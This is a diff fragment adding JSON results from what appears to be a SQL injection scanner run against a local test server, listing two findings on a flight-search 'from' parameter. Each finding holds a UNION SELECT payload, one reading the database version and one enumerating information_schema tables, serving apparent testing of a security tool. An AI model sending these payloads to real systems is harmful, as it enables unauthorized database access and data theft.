+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 3
+    }
+  ]
+}
